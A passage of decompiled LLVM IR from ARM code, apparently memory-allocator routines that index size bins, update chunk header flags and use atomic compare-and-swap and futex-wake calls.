  %v1_13388 = phi i32 [ %v1_13388.pre, %dec_label_pc_1336c ], [ ptrtoint (i32* @global_var_223b8.560 to i32), %dec_label_pc_132a4 ]
  %v0_13384 = phi i32 [ %v0_13384.pre, %dec_label_pc_1336c ], [ %v3_132ac, %dec_label_pc_132a4 ]
  %v1_13384 = add i32 %v0_13384, 8
  store i32 %v1_13384, i32* %r3.global-to-local, align 4
  %v2_13388 = add i32 %v1_13384, %v1_13388
  store i32 %v2_13388, i32* @r7, align 4
  br label %dec_label_pc_1338c

dec_label_pc_1338c:                               ; preds = %dec_label_pc_1338c.dec_label_pc_1338c_crit_edge, %dec_label_pc_13384
  %v0_1338c = phi i32 [ %v0_1338c.pre, %dec_label_pc_1338c.dec_label_pc_1338c_crit_edge ], [ %v2_13388, %dec_label_pc_13384 ]
  %v1_1338c = inttoptr i32 %v0_1338c to i32*
  %v2_1338c = load i32, i32* %v1_1338c, align 4
  store i32 %v2_1338c, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v0_1338c, i32* %r2.global-to-local, align 4
  %v4_1339c = call i32 @function_15cec(i32 %v2_1338c, i32 1, i32* %v1_1338c)
  %v2_133a0 = icmp eq i32 %v4_1339c, 0
  store i1 %v2_133a0, i1* @cpsr_z, align 1
  br i1 %v2_133a0, label %dec_label_pc_133a8, label %dec_label_pc_1338c.dec_label_pc_1338c_crit_edge

dec_label_pc_1338c.dec_label_pc_1338c_crit_edge:  ; preds = %dec_label_pc_1338c
  %v0_1338c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1338c

dec_label_pc_133a8:                               ; preds = %dec_label_pc_1338c
  %v0_13364 = load i32, i32* @r4, align 4
  %v2_13364 = icmp eq i32 %v0_13364, 0
  br i1 %v2_13364, label %dec_label_pc_133c0, label %dec_label_pc_1336c

dec_label_pc_133ac:                               ; preds = %dec_label_pc_13328
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_133b8 = load i32, i32* %fp.global-to-local, align 4
  %v1_133b8 = inttoptr i32 %v0_133b8 to i32*
  %v2_133b8 = load i32, i32* %v1_133b8, align 4
  br label %dec_label_pc_13348

dec_label_pc_133c0:                               ; preds = %dec_label_pc_133a8
  %v0_133c0 = load i32, i32* %fp.global-to-local, align 4
  %v1_133c0 = inttoptr i32 %v0_133c0 to i32*
  %v2_133c0 = load i32, i32* %v1_133c0, align 4
  store i32 %v2_133c0, i32* @r0, align 4
  %v0_132c8.pre = load i32, i32* @r8, align 4
  %v0_132cc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_132c8

dec_label_pc_133c8:                               ; preds = %.thread4
  %v1_133c8 = and i32 %v0_132ec, -2
  store i32 %v1_133c8, i32* %r3.global-to-local, align 4
  %v1_133cc = load i32, i32* %fp.global-to-local, align 4
  %v2_133cc = sub i32 %v1_133cc, %v1_133c8
  store i32 %v2_133cc, i32* %r7.global-to-local, align 4
  %v1_133d0 = add i32 %v2_133cc, 8
  %v1_133d4 = inttoptr i32 %v1_133d0 to i32*
  %v2_133d4 = load i32, i32* %v1_133d4, align 4
  store i32 %v2_133d4, i32* @r0, align 4
  %v3_133d4 = add i32 %v2_133cc, 12
  %v4_133d4 = inttoptr i32 %v3_133d4 to i32*
  %v5_133d4 = load i32, i32* %v4_133d4, align 4
  store i32 %v5_133d4, i32* %ip.global-to-local, align 4
  %v9_133d8 = icmp eq i32 %v5_133d4, %v2_133d4
  br i1 %v9_133d8, label %dec_label_pc_13478, label %dec_label_pc_133e0

dec_label_pc_133e0:                               ; preds = %dec_label_pc_133c8, %dec_label_pc_134d8
  %v0_133ec = phi i32 [ %v2_133cc, %dec_label_pc_133c8 ], [ %v0_134d8, %dec_label_pc_134d8 ]
  %v1_133e0 = add i32 %v0_133ec, 4
  %v2_133e0 = inttoptr i32 %v1_133e0 to i32*
  %v3_133e0 = load i32, i32* %v2_133e0, align 4
  %v1_133e4 = or i32 %v3_133e0, 1
  store i32 %v1_133e4, i32* %r2.global-to-local, align 4
  %v1_133e8 = and i32 %v3_133e0, -2
  store i32 %v1_133e8, i32* %r1.global-to-local, align 4
  %v2_133ec = add i32 %v1_133e8, %v0_133ec
  %v3_133ec = inttoptr i32 %v2_133ec to i32*
  %v4_133ec = load i32, i32* %v3_133ec, align 4
  %v1_133f0 = or i32 %v4_133ec, 1
  store i32 %v1_133f0, i32* %r3.global-to-local, align 4
  store i32 %v1_133f0, i32* %v3_133ec, align 4
  %v0_133f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_133f8 = load i32, i32* %r7.global-to-local, align 4
  %v2_133f8 = add i32 %v1_133f8, 4
  %v3_133f8 = inttoptr i32 %v2_133f8 to i32*
  store i32 %v0_133f8, i32* %v3_133f8, align 4
  %v0_133fc = load i32, i32* @r5, align 4
  %v1_133fc = add i32 %v0_133fc, 8
  store i32 %v1_133fc, i32* %r4.global-to-local, align 4
  %v0_13400 = load i32, i32* @r0, align 4
  %v1_13400 = load i32, i32* %ip.global-to-local, align 4
  %v2_13400 = add i32 %v1_13400, 8
  %v3_13400 = inttoptr i32 %v2_13400 to i32*
  store i32 %v0_13400, i32* %v3_13400, align 4
  %v0_13404 = load i32, i32* %r4.global-to-local, align 4
  %v1_13404 = load i32, i32* %sb.global-to-local, align 4
  %v2_13404 = add i32 %v1_13404, %v0_13404
  %v3_13404 = inttoptr i32 %v2_13404 to i32*
  %v4_13404 = load i32, i32* %v3_13404, align 4
  store i32 %v4_13404, i32* %r3.global-to-local, align 4
  %v0_13408 = load i32, i32* %r7.global-to-local, align 4
  %v1_13408 = add i32 %v0_13408, 8
  %v2_13408 = inttoptr i32 %v1_13408 to i32*
  %v3_13408 = load i32, i32* %v2_13408, align 4
  store i32 %v3_13408, i32* %r2.global-to-local, align 4
  %v2_1340c = icmp eq i32 %v4_13404, 0
  store i1 %v2_1340c, i1* @cpsr_z, align 1
  %v0_13410 = load i32, i32* %ip.global-to-local, align 4
  %v2_13410 = add i32 %v3_13408, 12
  %v3_13410 = inttoptr i32 %v2_13410 to i32*
  store i32 %v0_13410, i32* %v3_13410, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r1.global-to-local, align 4
  %v0_13418 = load i32, i32* %r4.global-to-local, align 4
  %v1_13418 = load i32, i32* %sb.global-to-local, align 4
  %v2_13418 = add i32 %v1_13418, %v0_13418
  store i32 %v2_13418, i32* @r6, align 4
  br i1 %v2_1340c, label %dec_label_pc_1345c, label %dec_label_pc_13420

dec_label_pc_13420:                               ; preds = %dec_label_pc_133e0
  %v0_13420 = call i32 @function_15c98()
  store i32 %v0_13420, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13428 = load i32, i32* %r4.global-to-local, align 4
  %v2_13428 = load i32, i32* %r1.global-to-local, align 4
  %v3_13428 = add i32 %v2_13428, %v1_13428
  %v4_13428 = inttoptr i32 %v3_13428 to i32*
  store i32 0, i32* %v4_13428, align 4
  %v0_1342c = call i32 @function_15c98()
  %v0_13430 = load i32, i32* @r5, align 4
  %v1_13430 = add i32 %v0_13430, 12
  store i32 %v1_13430, i32* %r3.global-to-local, align 4
  %v1_13434 = load i32, i32* %r1.global-to-local, align 4
  %v2_13434 = add i32 %v1_13434, %v1_13430
  %v3_13434 = inttoptr i32 %v2_13434 to i32*
  %v4_13434 = load i32, i32* %v3_13434, align 4
  store i32 %v4_13434, i32* %r2.global-to-local, align 4
  %v2_13438 = icmp eq i32 %v4_13434, 0
  br i1 %v2_13438, label %dec_label_pc_1345c, label %dec_label_pc_13440

dec_label_pc_13440:                               ; preds = %dec_label_pc_13420
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_13444 = load i32, i32* @r6, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_13454 = icmp eq i32 %v0_13444, -38
  br i1 %v7_13454, label %dec_label_pc_13464, label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13440, %dec_label_pc_13420, %dec_label_pc_133e0
  br label %dec_label_pc_13358

dec_label_pc_13464:                               ; preds = %dec_label_pc_13440
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13358

dec_label_pc_13478:                               ; preds = %dec_label_pc_133c8
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1347c = load i32, i32* @r8, align 4
  %v1_1347c = sub i32 32, %v0_1347c
  store i32 %v1_1347c, i32* %r1.global-to-local, align 4
  %v7_13484 = lshr i32 1, %v1_1347c
  store i32 %v7_13484, i32* %r4.global-to-local, align 4
  %v1_13488 = add i32 %v0_1347c, -32
  %v6_13488 = icmp slt i32 %v1_13488, 0
  %v7_13488 = icmp eq i32 %v0_1347c, 32
  store i1 %v7_13488, i1* @cpsr_z, align 1
  %v6_1348c = shl i32 1, %v0_1347c
  store i32 %v6_1348c, i32* %r3.global-to-local, align 4
  br i1 %v6_13488, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_13478
  %v7_13490 = shl i32 1, %v1_13488
  store i32 %v7_13490, i32* %r4.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_13478, %bb32
  %v0_13498 = phi i32 [ %v7_13484, %dec_label_pc_13478 ], [ %v7_13490, %bb32 ]
  %v1_13494 = sub i32 -1, %v6_1348c
  %v1_13498 = sub i32 -1, %v0_13498
  store i32 %v1_13498, i32* %fp.global-to-local, align 4
  store i32 %v1_13494, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_134a0

dec_label_pc_134a0:                               ; preds = %dec_label_pc_134a0.dec_label_pc_134a0_crit_edge, %bb33
  %v1_134a8 = phi i32 [ %v1_134a8.pre, %dec_label_pc_134a0.dec_label_pc_134a0_crit_edge ], [ %v1_13494, %bb33 ]
  %v2_134a0 = load i32, i32* @global_var_223b8.560, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v2_134a8 = and i32 %v2_134a0, %v1_134a8
  store i32 %v2_134a8, i32* %r1.global-to-local, align 4
  %v4_134ac = call i32 @function_15cec(i32 %v2_134a0, i32 %v2_134a8, i32* nonnull @global_var_223b8.560)
  %v2_134b0 = icmp eq i32 %v4_134ac, 0
  store i1 %v2_134b0, i1* @cpsr_z, align 1
  br i1 %v2_134b0, label %dec_label_pc_134b8, label %dec_label_pc_134a0.dec_label_pc_134a0_crit_edge

dec_label_pc_134a0.dec_label_pc_134a0_crit_edge:  ; preds = %dec_label_pc_134a0
  %v1_134a8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_134a0

dec_label_pc_134b8:                               ; preds = %dec_label_pc_134a0
  %v0_134bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_134bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_134c0

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge, %dec_label_pc_134b8
  %v1_134c8 = phi i32 [ %v1_134c8.pre, %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge ], [ %v0_134bc, %dec_label_pc_134b8 ]
  %v2_134c0 = load i32, i32* @global_var_223bc.562, align 4
  store i32 ptrtoint (i32* @global_var_223bc.562 to i32), i32* %r2.global-to-local, align 4
  %v2_134c8 = and i32 %v2_134c0, %v1_134c8
  store i32 %v2_134c8, i32* %r1.global-to-local, align 4
  %v4_134cc = call i32 @function_15cec(i32 %v2_134c0, i32 %v2_134c8, i32* nonnull @global_var_223bc.562)
  %v2_134d0 = icmp eq i32 %v4_134cc, 0
  store i1 %v2_134d0, i1* @cpsr_z, align 1
  br i1 %v2_134d0, label %dec_label_pc_134d8, label %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge

dec_label_pc_134c0.dec_label_pc_134c0_crit_edge:  ; preds = %dec_label_pc_134c0
  %v1_134c8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_134c0

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134c0
  %v0_134d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_134d8 = add i32 %v0_134d8, 8
  %v1_134dc = inttoptr i32 %v1_134d8 to i32*
  %v2_134dc = load i32, i32* %v1_134dc, align 4
  store i32 %v2_134dc, i32* @r0, align 4
  %v3_134dc = add i32 %v0_134d8, 12
  %v4_134dc = inttoptr i32 %v3_134dc to i32*
  %v5_134dc = load i32, i32* %v4_134dc, align 4
  store i32 %v5_134dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_133e0

; uselistorder directives
  uselistorder i32 %v0_134d8, { 1, 2, 0 }
  uselistorder i32 %v2_134c0, { 1, 0 }
  uselistorder i32 %v2_134a0, { 1, 0 }
  uselistorder i32 %v1_13494, { 1, 0 }
  uselistorder i32 %v2_133c0, { 1, 0 }
  uselistorder i32 %v0_1338c, { 1, 0 }
  uselistorder i32 %v0_13348, { 0, 2, 1 }
  uselistorder i32 %v0_132ec, { 0, 2, 1 }
  uselistorder i32 %v4_132d8, { 1, 0 }
  uselistorder i32 %v4_132cc, { 1, 0 }
  uselistorder i32 %v3_132ac, { 2, 1, 0 }
  uselistorder i32 %v0_132ac, { 1, 0 }
  uselistorder i32 %v1_1327c, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v3_13278, { 1, 0 }
  uselistorder i32 %v2_13264, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_133e0, { 1, 0 }
  uselistorder label %dec_label_pc_13384, { 1, 0 }
  uselistorder label %dec_label_pc_13348, { 1, 2, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_132c8, { 1, 0 }
  uselistorder label %dec_label_pc_132a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13278, { 1, 0 }
}

define i32 @function_134f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_134f0:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_134f0 = load i32, i32* @r4, align 4
  store i32 %v3_134f0, i32* %stack_var_-36, align 4
  %v6_134f0 = load i32, i32* @r5, align 4
  %v9_134f0 = load i32, i32* @r6, align 4
  %v12_134f0 = load i32, i32* @r7, align 4
  %v15_134f0 = load i32, i32* @r8, align 4
  %v21_134f0 = load i32, i32* @sl, align 4
  %v1_134f4 = add i32 %arg1, 4
  %v2_134f4 = inttoptr i32 %v1_134f4 to i32*
  %v3_134f4 = load i32, i32* %v2_134f4, align 4
  store i32 %v3_134f4, i32* @sl, align 4
  %v1_134f8 = urem i32 %v3_134f4, 2
  %v2_134f8 = icmp eq i32 %v1_134f8, 0
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %v3_134f4, i32* %r7.global-to-local, align 4
  br i1 %v2_134f8, label %dec_label_pc_1350c, label %dec_label_pc_135ec

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134f0, %dec_label_pc_135e0
  %v0_1350c = phi i32 [ %v0_135e0, %dec_label_pc_135e0 ], [ %v3_134f4, %dec_label_pc_134f0 ]
  %v3_1350c = udiv i32 %v0_1350c, 16
  store i32 %v3_1350c, i32* %r3.global-to-local, align 4
  %v1_13510 = add nsw i32 %v3_1350c, -1
  store i32 %v1_13510, i32* @r0, align 4
  %tmp = icmp ult i32 %v1_13510, 33
  br i1 %tmp, label %.thread, label %dec_label_pc_13520

.thread:                                          ; preds = %dec_label_pc_1350c
  store i32 %v1_13510, i32* @r8, align 4
  br label %dec_label_pc_13538

dec_label_pc_13520:                               ; preds = %dec_label_pc_1350c
  %tmp37 = icmp ugt i32 %v1_13510, 7168
  br i1 %tmp37, label %.thread19, label %dec_label_pc_1352c

.thread19:                                        ; preds = %dec_label_pc_13520
  store i32 63, i32* @r8, align 4
  br label %dec_label_pc_13538

dec_label_pc_1352c:                               ; preds = %dec_label_pc_13520
  %v0_1352c = call i32 @function_17570()
  %v3_13530 = udiv i32 %v0_1352c, 2097152
  %v1_13534 = add nsw i32 %v3_13530, -496
  store i32 %v1_13534, i32* @r8, align 4
  br label %dec_label_pc_13538

dec_label_pc_13538:                               ; preds = %.thread19, %.thread, %dec_label_pc_1352c
  %v0_13540 = phi i32 [ 63, %.thread19 ], [ %v1_13510, %.thread ], [ %v1_13534, %dec_label_pc_1352c ]
  %v3_1353c = load i32, i32* @global_var_22ae8.558, align 4
  store i32 %v3_1353c, i32* %r2.global-to-local, align 4
  %v3_13540 = mul i32 %v0_13540, 16
  store i32 %v3_13540, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %sb.global-to-local, align 4
  %v2_13548 = icmp eq i32 %v3_1353c, 0
  store i1 %v2_13548, i1* @cpsr_z, align 1
  %v1_1354c = or i32 %v3_13540, 8
  store i32 %v1_1354c, i32* %r3.global-to-local, align 4
  %v2_13550 = add i32 %v1_1354c, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v2_13550, i32* @r6, align 4
  br i1 %v2_13548, label %bb, label %dec_label_pc_1361c

bb:                                               ; preds = %dec_label_pc_13538
  %v1_13554 = load i32, i32* @sl, align 4
  store i32 %v1_13554, i32* @r0, align 4
  br label %dec_label_pc_1355c

dec_label_pc_1355c:                               ; preds = %bb, %dec_label_pc_13644
  %v0_1358036 = phi i32 [ %v1_13554, %bb ], [ %v3_13644, %dec_label_pc_13644 ]
  %v0_13560 = phi i32 [ ptrtoint (i32* @global_var_223b8.560 to i32), %bb ], [ %v0_13560.pre, %dec_label_pc_13644 ]
  %v0_1355c = phi i32 [ %v0_13540, %bb ], [ %v0_1355c.pre, %dec_label_pc_13644 ]
  %v1_1355c = add i32 %v0_1355c, 1
  store i32 %v1_1355c, i32* %r1.global-to-local, align 4
  %v4_13560 = mul i32 %v1_1355c, 16
  %v5_13560 = add i32 %v4_13560, %v0_13560
  %v6_13560 = inttoptr i32 %v5_13560 to i32*
  %v7_13560 = load i32, i32* %v6_13560, align 4
  store i32 %v7_13560, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @r6, align 4
  %v2_13568 = icmp eq i32 %v7_13560, 0
  br i1 %v2_13568, label %bb31, label %.thread4

bb31:                                             ; preds = %dec_label_pc_1355c
  %v4_1356c = mul i32 %v1_1355c, 16
  %v3_13570 = add i32 %v4_1356c, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v3_13570, i32* %r3.global-to-local, align 4
  %v2_13574 = add i32 %v4_1356c, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8)
  store i32 %v2_13574, i32* %r2.global-to-local, align 4
  %v7_13578 = add i32 %v4_13560, ptrtoint (i32* @global_var_223b8.560 to i32)
  %v8_13578 = inttoptr i32 %v7_13578 to i32*
  store i32 %v2_13574, i32* %v8_13578, align 4
  %v1_1357c = load i32, i32* %r2.global-to-local, align 4
  %v2_1357c = load i32, i32* %r3.global-to-local, align 4
  %v3_1357c = add i32 %v2_1357c, 4
  %v4_1357c = inttoptr i32 %v3_1357c to i32*
  store i32 %v1_1357c, i32* %v4_1357c, align 4
  %v0_13580.pre = load i32, i32* @r0, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1355c, %bb31
  %v0_13580 = phi i32 [ %v0_1358036, %dec_label_pc_1355c ], [ %v0_13580.pre, %bb31 ]
  %v1_13580 = load i32, i32* @sl, align 4
  %v9_13580 = icmp eq i32 %v0_13580, %v1_13580
  br i1 %v9_13580, label %dec_label_pc_13660, label %dec_label_pc_13588

dec_label_pc_13588:                               ; preds = %.thread4
  %v0_13588 = load i32, i32* @r5, align 4
  %v1_13588 = add i32 %v0_13588, 8
  store i32 %v1_13588, i32* %r2.global-to-local, align 4
  %v1_1358c = load i32, i32* @r6, align 4
  %v2_1358c = add i32 %v1_1358c, %v1_13588
  %v3_1358c = inttoptr i32 %v2_1358c to i32*
  %v4_1358c = load i32, i32* %v3_1358c, align 4
  store i32 %v4_1358c, i32* %r3.global-to-local, align 4
  %v2_13590 = icmp eq i32 %v4_1358c, 0
  store i1 %v2_13590, i1* @cpsr_z, align 1
  store i32 %v2_1358c, i32* %r4.global-to-local, align 4
  br i1 %v2_13590, label %dec_label_pc_135e0, label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13588
  %v0_1359c = call i32 @function_15c98()
  store i32 %v0_1359c, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_135a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_135a4 = load i32, i32* @r6, align 4
  %v3_135a4 = add i32 %v2_135a4, %v1_135a4
  %v4_135a4 = inttoptr i32 %v3_135a4 to i32*
  store i32 0, i32* %v4_135a4, align 4
  %v0_135a8 = call i32 @function_15c98()
  %v0_135ac = load i32, i32* @r5, align 4
  %v1_135ac = add i32 %v0_135ac, 12
  store i32 %v1_135ac, i32* %r3.global-to-local, align 4
  %v1_135b0 = load i32, i32* @r6, align 4
  %v2_135b0 = add i32 %v1_135b0, %v1_135ac
  %v3_135b0 = inttoptr i32 %v2_135b0 to i32*
  %v4_135b0 = load i32, i32* %v3_135b0, align 4
  store i32 %v4_135b0, i32* %r2.global-to-local, align 4
  %v2_135b4 = icmp eq i32 %v4_135b0, 0
  br i1 %v2_135b4, label %dec_label_pc_135d8, label %dec_label_pc_135bc

dec_label_pc_135bc:                               ; preds = %dec_label_pc_1359c
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_135c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_135d0 = icmp eq i32 %v0_135c0, -38
  br i1 %v7_135d0, label %dec_label_pc_13650, label %dec_label_pc_135d8

dec_label_pc_135d8:                               ; preds = %dec_label_pc_135bc, %dec_label_pc_1359c, %dec_label_pc_13650
  %v0_135d8 = load i32, i32* %fp.global-to-local, align 4
  %v1_135d8 = add i32 %v0_135d8, 4
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  store i32 %v3_135d8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_13588, %dec_label_pc_135d8
  %v0_135e0 = phi i32 [ %v0_13580, %dec_label_pc_13588 ], [ %v3_135d8, %dec_label_pc_135d8 ]
  store i32 %v0_135e0, i32* @sl, align 4
  %v1_135e4 = urem i32 %v0_135e0, 2
  %v2_135e4 = icmp eq i32 %v1_135e4, 0
  br i1 %v2_135e4, label %dec_label_pc_1350c, label %dec_label_pc_135ec

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135e0, %dec_label_pc_134f0
  br label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_136f0, %dec_label_pc_136e8, %dec_label_pc_135ec
  %v1_135f8 = phi i32 [ 1, %dec_label_pc_136f0 ], [ 1, %dec_label_pc_136e8 ], [ 0, %dec_label_pc_135ec ]
  %v2_135f4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_135f4, i32* @r4, align 4
  store i32 %v6_134f0, i32* @r5, align 4
  store i32 %v9_134f0, i32* @r6, align 4
  store i32 %v12_134f0, i32* @r7, align 4
  store i32 %v15_134f0, i32* @r8, align 4
  store i32 %v21_134f0, i32* @sl, align 4
  ret i32 %v1_135f8

dec_label_pc_13604:                               ; preds = %dec_label_pc_13640
  %v0_13604 = load i32, i32* @r5, align 4
  %v1_13604 = add i32 %v0_13604, 12
  store i32 1, i32* @r2, align 4
  %v1_1360c = load i32, i32* %sb.global-to-local, align 4
  %v2_1360c = add i32 %v1_13604, %v1_1360c
  store i32 %v2_1360c, i32* %r1.global-to-local, align 4
  %v0_13610 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v2_13618 = inttoptr i32 %v0_13610 to i32*
  %v3_13618 = call i32 @function_15818(i32* %v2_13618, i32 %v2_1360c)
  %v0_1361c.pre = load i32, i32* @r5, align 4
  %v1_13620.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1361c

dec_label_pc_1361c:                               ; preds = %dec_label_pc_13538, %dec_label_pc_13604
  %v1_13620 = phi i32 [ %v1_13620.pre, %dec_label_pc_13604 ], [ ptrtoint (i32* @global_var_223b8.560 to i32), %dec_label_pc_13538 ]
  %v0_1361c = phi i32 [ %v0_1361c.pre, %dec_label_pc_13604 ], [ %v3_13540, %dec_label_pc_13538 ]
  %v1_1361c = add i32 %v0_1361c, 8
  store i32 %v1_1361c, i32* %r3.global-to-local, align 4
  %v2_13620 = add i32 %v1_1361c, %v1_13620
  store i32 %v2_13620, i32* @r7, align 4
  br label %dec_label_pc_13624

dec_label_pc_13624:                               ; preds = %dec_label_pc_13624.dec_label_pc_13624_crit_edge, %dec_label_pc_1361c
  %v0_13624 = phi i32 [ %v0_13624.pre, %dec_label_pc_13624.dec_label_pc_13624_crit_edge ], [ %v2_13620, %dec_label_pc_1361c ]
  %v1_13624 = inttoptr i32 %v0_13624 to i32*
  %v2_13624 = load i32, i32* %v1_13624, align 4
  store i32 %v2_13624, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v0_13624, i32* %r2.global-to-local, align 4
  %v4_13634 = call i32 @function_15cec(i32 %v2_13624, i32 1, i32* %v1_13624)
  %v2_13638 = icmp eq i32 %v4_13634, 0
  store i1 %v2_13638, i1* @cpsr_z, align 1
  br i1 %v2_13638, label %dec_label_pc_13640, label %dec_label_pc_13624.dec_label_pc_13624_crit_edge

dec_label_pc_13624.dec_label_pc_13624_crit_edge:  ; preds = %dec_label_pc_13624
  %v0_13624.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13624

dec_label_pc_13640:                               ; preds = %dec_label_pc_13624
  %v0_135fc = load i32, i32* @r4, align 4
  %v2_135fc = icmp eq i32 %v0_135fc, 0
  br i1 %v2_135fc, label %dec_label_pc_13644, label %dec_label_pc_13604

dec_label_pc_13644:                               ; preds = %dec_label_pc_13640
  %v0_13644 = load i32, i32* %fp.global-to-local, align 4
  %v1_13644 = add i32 %v0_13644, 4
  %v2_13644 = inttoptr i32 %v1_13644 to i32*
  %v3_13644 = load i32, i32* %v2_13644, align 4
  store i32 %v3_13644, i32* @r0, align 4
  store i32 %v3_13644, i32* %r7.global-to-local, align 4
  %v0_1355c.pre = load i32, i32* @r8, align 4
  %v0_13560.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1355c

dec_label_pc_13650:                               ; preds = %dec_label_pc_135bc
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_135d8

dec_label_pc_13660:                               ; preds = %.thread4
  %v0_13660 = load i32, i32* %fp.global-to-local, align 4
  %v1_13660 = add i32 %v0_13660, 12
  %v2_13660 = inttoptr i32 %v1_13660 to i32*
  %v3_13660 = load i32, i32* %v2_13660, align 4
  store i32 %v3_13660, i32* @r0, align 4
  %v1_13664 = add i32 %v0_13660, 8
  %v2_13664 = inttoptr i32 %v1_13664 to i32*
  %v3_13664 = load i32, i32* %v2_13664, align 4
  store i32 %v3_13664, i32* %r1.global-to-local, align 4
  %v9_13668 = icmp eq i32 %v3_13660, %v3_13664
  br i1 %v9_13668, label %dec_label_pc_13704, label %dec_label_pc_13660.dec_label_pc_13670_crit_edge

dec_label_pc_13660.dec_label_pc_13670_crit_edge:  ; preds = %dec_label_pc_13660
  %v0_13670.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13670

dec_label_pc_13670:                               ; preds = %dec_label_pc_13660.dec_label_pc_13670_crit_edge, %dec_label_pc_13764
  %v2_13680 = phi i32 [ %v0_13660, %dec_label_pc_13660.dec_label_pc_13670_crit_edge ], [ %v0_13764, %dec_label_pc_13764 ]
  %v0_13670 = phi i32 [ %v0_13670.pre, %dec_label_pc_13660.dec_label_pc_13670_crit_edge ], [ %v3_13764, %dec_label_pc_13764 ]
  %v1_13670 = or i32 %v0_13670, 1
  store i32 %v1_13670, i32* %r7.global-to-local, align 4
  %v1_13674 = and i32 %v0_13670, -2
  store i32 %v1_13674, i32* %r2.global-to-local, align 4
  %v2_13678 = add i32 %v1_13674, %v2_13680
  %v3_13678 = inttoptr i32 %v2_13678 to i32*
  %v4_13678 = load i32, i32* %v3_13678, align 4
  %v1_1367c = or i32 %v4_13678, 1
  store i32 %v1_1367c, i32* %r3.global-to-local, align 4
  store i32 %v1_1367c, i32* %v3_13678, align 4
  %v0_13684 = load i32, i32* %r7.global-to-local, align 4
  %v1_13684 = load i32, i32* %fp.global-to-local, align 4
  %v2_13684 = add i32 %v1_13684, 4
  %v3_13684 = inttoptr i32 %v2_13684 to i32*
  store i32 %v0_13684, i32* %v3_13684, align 4
  %v0_13688 = load i32, i32* @r5, align 4
  %v1_13688 = add i32 %v0_13688, 8
  store i32 %v1_13688, i32* %r4.global-to-local, align 4
  %v0_1368c = load i32, i32* %r1.global-to-local, align 4
  %v1_1368c = load i32, i32* @r0, align 4
  %v2_1368c = add i32 %v1_1368c, 8
